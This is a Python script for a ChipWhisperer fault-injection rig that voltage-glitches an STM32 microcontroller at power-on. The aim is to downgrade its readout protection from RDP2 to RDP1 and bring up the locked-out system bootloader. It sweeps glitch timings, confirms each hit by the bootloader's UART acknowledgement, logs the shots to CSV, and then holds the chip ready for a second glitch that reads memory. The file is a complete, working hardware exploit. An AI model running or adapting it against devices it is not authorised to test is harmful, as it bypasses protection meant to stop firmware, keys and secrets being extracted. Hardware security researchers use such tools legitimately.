#!/usr/bin/env python
"""glitch1_bootloader.py - RDP2->RDP1 boot glitch, POWER-ON trigger + BOOT0-HIGH
+ UART-ACK success detection.

Why this method:
  - POWER-ON trigger: each shot is a full cold power-cycle; the chip's internal
    POR drives NRST low then releases, and the CW triggers on that POR-release
    rising edge (t=0) - the same cold-boot frame mkesenheimer's working RDP2->RDP1
    glitch uses. The glitch fires ext_offset cycles after t=0.
  - BOOT0 HIGH: aims the chip at the STM32 system bootloader. At RDP2 the
    bootloader is FORBIDDEN to start. A successful glitch corrupts the BootROM RDP
    read -> chip behaves as RDP1 -> the bootloader starts.
  - UART-ACK detect: a live bootloader ACKs 0x7F with 0x79 on UART. That ACK =
    glitch-1 landed, and it leaves us sitting in the (RDP1-behaving) bootloader,
    ready for glitch-2 (Read Memory). Faster and cleaner than the SWD check.

Read-only + crowbar: no option-byte writes, no erase. Safe for the chip.

Env: G1_CLKGEN(100e6) G1_EXT_MIN/MAX/STEP G1_SAMPLES G1_REPEAT G1_OFFSET G1_WIDTH
     G1_NRST(tio4) G1_POWER_OFF_MS(60) G1_SETTLE_MS(60) G1_STOP_ON_SUCCESS(1)
     G1_COOLDOWN(0.05)
"""
import os, sys, time, csv
from datetime import datetime
import chipwhisperer as cw
import serial
from serialfind import find_ftdi

CLKGEN   = float(os.environ.get('G1_CLKGEN', 100e6))
EXT_MIN  = int(os.environ.get('G1_EXT_MIN', 0))
EXT_MAX  = int(os.environ.get('G1_EXT_MAX', 40000))
EXT_STEP = int(os.environ.get('G1_STEP', 50))
SAMPLES  = int(os.environ.get('G1_SAMPLES', 2))
REPEAT   = int(os.environ.get('G1_REPEAT', 20))
OFFSET   = int(os.environ.get('G1_OFFSET', -45))
WIDTH    = int(os.environ.get('G1_WIDTH', 40))
NRST     = os.environ.get('G1_NRST', 'tio4').lower()
POWER_OFF_MS = float(os.environ.get('G1_POWER_OFF_MS', 60))
SETTLE_MS = float(os.environ.get('G1_SETTLE_MS', 60))
STOP_OK  = os.environ.get('G1_STOP_ON_SUCCESS', '1') == '1'
COOLDOWN = float(os.environ.get('G1_COOLDOWN', 0.05))

UART = find_ftdi()
scope = None
ser = None


def setup_scope():
    s = cw.scope()
    s.clock.clkgen_freq = CLKGEN                 # clkgen FIRST
    s.adc.samples = 24400
    s.glitch.clk_src = 'clkgen'
    s.glitch.output = 'enable_only'              # crowbar
    s.glitch.trigger_src = 'ext_single'
    s.glitch.width = WIDTH
    s.glitch.offset = OFFSET
    s.glitch.repeat = REPEAT
    s.io.glitch_lp = True
    s.io.glitch_hp = True
    s.trigger.triggers = NRST                    # trigger on POR-release edge
    setattr(s.io, NRST, 'high_z')                # chip POR owns NRST
    s.io.tio1 = True                             # BOOT0 HIGH  -> system bootloader
    s.io.tio2 = False                            # BOOT1 LOW   -> bootloader (not SRAM)
    s.io.tio3 = 'high_z'
    s.io.target_pwr = True
    return s


def serial_open():
    return serial.Serial(UART, 115200, bytesize=8, parity='E', stopbits=1,
                         timeout=0.15)


def power_on_glitch(ext):
    """Cold power-cycle; chip POR drives NRST -> CW triggers on its release ->
    glitch fires ext cycles later. Power stays ON afterwards for the UART check."""
    scope.glitch.ext_offset = ext
    setattr(scope.io, NRST, 'high_z')            # let the chip's POR own NRST
    scope.io.target_pwr = False                  # power OFF (cold)
    time.sleep(POWER_OFF_MS / 1000.0)            # discharge (caps off -> fast)
    scope.arm()                                  # arm BEFORE power-on
    scope.io.target_pwr = True                   # power ON -> POR -> trigger -> glitch


def uart_ack():
    """Bootloader alive? autobaud 0x7F -> 0x79 ACK (RDP1 behaviour). At RDP2 the
    bootloader never starts, so we only see silence / junk."""
    for _ in range(4):
        try:
            ser.reset_input_buffer()
            ser.write(b'\x7f')
            r = ser.read(4)
        except Exception as e:
            return False, f'uart_err:{type(e).__name__}'
        if b'\x79' in r:
            return True, 'ACK 0x79 (bootloader LIVE = RDP2->RDP1 landed)'
    return False, 'silent'


def main():
    global scope, ser
    print('=' * 70)
    print('glitch-1 RDP2->RDP1 : POWER-ON trigger + BOOT0-HIGH + UART-ACK detect')
    print(f'clkgen={CLKGEN/1e6:g}MHz  ext {EXT_MIN}-{EXT_MAX} '
          f'({EXT_MIN/(CLKGEN/1e6):.0f}-{EXT_MAX/(CLKGEN/1e6):.0f}us) step {EXT_STEP}'
          f'  rep {REPEAT} off {OFFSET}  pwr-off {POWER_OFF_MS:g}ms settle {SETTLE_MS:g}ms')
    print(f'UART={UART} (115200 8E1)   success = bootloader ACKs 0x7F -> 0x79')
    print('=' * 70)
    scope = setup_scope()
    ser = serial_open()
    os.makedirs('campaigns', exist_ok=True)
    logp = os.path.join('campaigns', f'glitch1bl_{datetime.now():%Y%m%d_%H%M%S}.csv')
    lw = csv.writer(open(logp, 'w', newline=''))
    lw.writerow(['shot', 'ext', 'us', 'result', 'info'])

    shot = 0
    ok_n = 0
    try:
        for ext in range(EXT_MIN, EXT_MAX + 1, EXT_STEP):
            us = ext / (CLKGEN / 1e6)
            for _ in range(SAMPLES):
                shot += 1
                power_on_glitch(ext)
                time.sleep(SETTLE_MS / 1000.0)       # bootloader comes up
                ok, info = uart_ack()
                lw.writerow([shot, ext, round(us, 1),
                             'SUCCESS' if ok else 'nolink', info])
                print(f'  [{datetime.now():%H:%M:%S}] #{shot} ext={ext} ({us:.1f}us) -> '
                      f'{"*** SUCCESS ***" if ok else "nolink"}'
                      + (f'  {info}' if ok else ''), flush=True)
                if ok:
                    ok_n += 1
                    print(f'\n[***] GLITCH-1 SUCCESS ext={ext} ({us:.1f}us): {info}\n',
                          flush=True)
                    try: os.system("spd-say 'glitch one success' 2>/dev/null &")
                    except Exception: pass
                    if STOP_OK:
                        print('[+] STOP_ON_SUCCESS - bootloader LIVE (RDP1 behaviour). '
                              'Holding power; do NOT power-cycle. Ready for glitch-2.')
                        return
                time.sleep(COOLDOWN)
    finally:
        print(f'[=] done: {shot} shots, {ok_n} successes -> {logp}')
        try: ser.close()
        except Exception: pass
        try:
            scope.io.glitch_hp = False
            scope.io.glitch_lp = False
            scope.dis()
        except Exception: pass


if __name__ == '__main__':
    main()
